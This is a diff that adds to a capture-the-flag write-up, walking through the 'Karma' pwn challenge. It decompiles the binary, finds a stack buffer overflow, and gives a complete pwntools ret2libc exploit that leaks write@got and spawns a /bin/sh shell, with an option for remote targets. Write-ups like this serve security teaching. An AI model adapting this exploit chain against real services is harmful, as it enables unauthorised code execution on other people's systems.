@@ -11,6 +11,9 @@
 -  Shellstorm
 -  Breakup
 
+## Cryptography
+- Row row row your boat
+
 ### Puts in boot [First Blood 🩸]
 
 We are given a binary file attached to it
@@ -278,5 +281,238 @@ With this I assumed that the other pwn challenges will be running on the same li
 ### Karma [First Blood 🩸]
 
 We are given a binary file attached to this challenge
+
+Checking the mitigations enabled shows this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d3e3b51b-5da7-4727-8a6b-529713ebc895)
+
+We are working with a x64 binary which is dynamically linked and not stripped
+
+The only protection enabled on this binary is `NX` which prevents the stack from being executable
+
+I'll run the binary to know what it does
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7bcb6155-8d34-47e4-8166-9f01b2449d55)
+
+It receives our option then another input and exit
+
+To understand what's happening I'll decompile the binary using ghidra
+
+Here's the main function
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2f740d70-0a0f-44e5-9fd0-cf1a9ec5648e)
+```c
+undefined8 main(void)
+
+{
+  char buffer [79];
+  char option;
+  
+  write(1,
+        "So now you know a thing or two about Andrej right?\nA: yes\nB: no\nC: I\'m honestly not sur e where this is headed.\n"
+        ,0x70);
+  __isoc99_scanf("%1s",&option);
+  if (option == 'A') {
+    write(1,
+          "Great! I\'m looking to hire people and build a team which would work on redefining machin e learning algos.\n"
+          ,0x6a);
+    write(1,
+          "Sadly, we don\'t have interviews these days, but can you get access to the artificial neu ral network?\n"
+          ,0x65);
+    getchar();
+    fgets(buffer,0x100,stdin);
+  }
+  else if (option == 'B') {
+    write(1,&stuffz,0x4f);
+  }
+  else if (option == 'C') {
+    write(1,"It\'ll get exciting, worry not :)\n",0x21);
+  }
+  else {
+    write(1,"A...B...C",9);
+  }
+  return 0;
+}
+```
+
+Looking at the code we can spot the vulnerability
+
+```c
+char buffer [79];
+
+  if (option == 'A') {
+    write(1,
+          "Great! I\'m looking to hire people and build a team which would work on redefining machin e learning algos.\n"
+          ,0x6a);
+    write(1,
+          "Sadly, we don\'t have interviews these days, but can you get access to the artificial neu ral network?\n"
+          ,0x65);
+    getchar();
+    fgets(buffer,0x100,stdin);
+```
+
+We can see that it assigns a buffer which can only hold up 79 bytes and then when option 'A' is chosen we get the option to store value to that buffer
+
+And it can receive up to 0x100 bytes which is stored in a buffer that can only hold up 79 bytes
+
+A buffer overflow :P
+
+I'll get the offset needed the overwrite the instruction pointer
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5b1dfb3b-2a7c-4cb7-8ef3-8195f3476d72)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/221017d3-5215-43db-b036-d3c422ca8a9e)
+
+The offset is 88
+
+How can we spawn shell from here?
+
+We can perform a ret2libc again but this time around use `write` to leak `write@got`
+
+From the syscall of [write](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0ab684c8-60a8-41fd-ab93-bcbf393f2931)
+
+```
+syscall name  | %rax  | %rdi  | %rsi      | %rdx
+write           0x1      fd     char *buf   size
+```
+
+We need the value of `rax` to be set to `0x1`, the value of `rdi` to be the file descriptor, the value of `rsi` to be the buffer to read/write and `rdx` to hold the size of bytes to read/write
+
+In our case here's how it will be:
+
+```
+write(0x1, write@got, 0x20)
+```
+
+We will write 200 bytes of the value of got of `write` to standard output
+
+The byte can also be just `8` afterall it's just 8 bytes that will be the value
+
+Now we need the gadgets 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9802007d-c624-4aa7-9b5d-cb31edbead44)
+
+Everything is set so let us exploit this 
+
+Here's how my exploit will go:
+- Leak got of write
+- Rop to system
+
+Here's my exploit script
+
+```python
+#!/usr/bin/python3
+# Author: Hack.You
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './karma'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+# Load libc library (identified version from server - https://libc.blukat.me)
+# libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')
+libc = elf.libc
+
+offset = 88
+
+pop_rdi = 0x0000000000401196 # pop rdi; ret;
+pop_rsi = 0x0000000000401198 # pop rsi; ret; 
+pop_rdx = 0x000000000040119a # pop rdx; ret; 
+
+ret = 0x000000000040101a # ret; 
+
+
+payload = flat({
+    offset: [
+        pop_rdi,
+        0x1,
+        pop_rsi,
+        elf.got['write'],
+        pop_rdx,
+        0x20,
+        elf.plt['write'],
+        elf.symbols['main']
+    ]
+})
+
+io.recvuntil('headed.')
+io.sendline('A')
+
+# Leak address
+io.sendline(payload) 
+io.recvline()
+io.recvuntil('network?')
+io.recvline()
+got_write = unpack(io.recv()[:6].ljust(8, b"\x00"))
+info("got write: %#x", got_write)
+
+# Calculate libc base
+libc.address = got_write - libc.symbols['write']
+info("libc_base: %#x", libc.address)
+
+sh = next(libc.search(b'/bin/sh\x00'))
+system = libc.symbols['system']
+info('/bin/sh: %#x', sh)
+info('system: %#x', system)
+
+# Payload to spawn shell
+payload = flat({
+    offset: [
+        pop_rdi, # System("/bin/sh")
+        sh,
+        ret,
+        system
+    ]
+})
+
+io.sendline('A')
+io.sendline(payload)
+
+io.interactive()
+```
+
+You will notice I didn't use any `pop rax` gadget and that's not needed because when the program execution eventually reaches `write@plt` the value of `rax` will be set to `0x1`
+
+Running the exploit works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/404fadc5-4f85-4462-b8ad-5c5b7559774e)
+
+Since we have the remote libc file we can use replace this in the exploit for it to work remotely:
+
+```python
+Replace: libc = elf.libc
+To: libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')
+```
+
+
+
+
+
+
+
+
+
 
 
